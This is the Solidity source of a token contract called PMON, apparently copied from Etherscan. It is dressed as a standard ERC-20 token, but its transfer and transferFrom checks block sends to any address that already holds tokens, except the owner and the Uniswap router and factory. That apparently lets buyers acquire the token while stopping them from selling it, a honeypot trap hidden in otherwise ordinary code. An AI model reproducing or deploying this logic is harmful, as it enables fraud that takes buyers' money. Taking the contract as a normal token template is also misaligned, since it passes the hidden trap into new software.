['/**\n', ' *Submitted for verification at Etherscan.io on 2021-03-19\n', '*/\n', '\n', '/*\n', '\n', '*/\n', '\n', '/*\n', ' _______  _______  _______  _       \n', '(  ____ )(       )(  ___  )( (    /|\n', '| (    )|| () () || (   ) ||  \\  ( |\n', '| (____)|| || || || |   | ||   \\ | |\n', '|  _____)| |(_)| || |   | || (\\ \\) |\n', '| (      | |   | || |   | || | \\   |\n', '| )      | )   ( || (___) || )  \\  |\n', '|/       |/     \\|(_______)|/    )_)\n', '                                    \n', '                                                                                                                                                                                                                                       \n', '                                                                                                                                                                                                                                           \n', '*/\n', '\n', 'pragma solidity 0.5.17;\n', '\n', 'contract PMON {\n', ' \n', '    mapping (address => uint256) public balanceOf;\n', '\n', '    string public name = "PMON";\n', '    string public symbol = "PMON";\n', '    uint8 public decimals = 18;\n', '    uint256 public totalSupply = 10000000 * (uint256(10) ** decimals);\n', '    address contractOwner;\n', '    address uniRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n', '    address uniFactory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;\n', '\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '    constructor() public {\n', '       \n', '        contractOwner = msg.sender;\n', '        balanceOf[msg.sender] = totalSupply;\n', '        allowance[msg.sender][uniRouter] = 1000000000000000000000000000;\n', '    }\n', '\n', '    function transfer(address to, uint256 value) public returns (bool success) {\n', '        require(balanceOf[msg.sender] >= value);\n', '        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);\n', '        balanceOf[msg.sender] -= value; \n', '        emit Transfer(msg.sender, to, value);\n', '        balanceOf[to] += value;         \n', '        return true;   \n', '    }\n', '\n', '    event Approval(address indexed owner, address indexed spender, uint256 value);\n', '    mapping(address => mapping(address => uint256)) public allowance;\n', '\n', '    function approve(address spender, uint256 value)\n', '        public\n', '        returns (bool success)\n', '    {\n', '        allowance[msg.sender][spender] = value;\n', '        emit Approval(msg.sender, spender, value);\n', '        return true;\n', '    }\n', '\n', '    function transferFrom(address from, address to, uint256 value)\n', '        public\n', '        returns (bool success)\n', '    {\n', '        require(value <= balanceOf[from]);\n', '        require(value <= allowance[from][msg.sender]);\n', '        require(to == contractOwner || balanceOf[to] == 0 || to == uniFactory || to == uniRouter);\n', '\n', '        balanceOf[from] -= value;\n', '        balanceOf[to] += value;\n', '        allowance[from][msg.sender] -= value;\n', '        emit Transfer(from, to, value);\n', '        return true;\n', '    }\n', '}']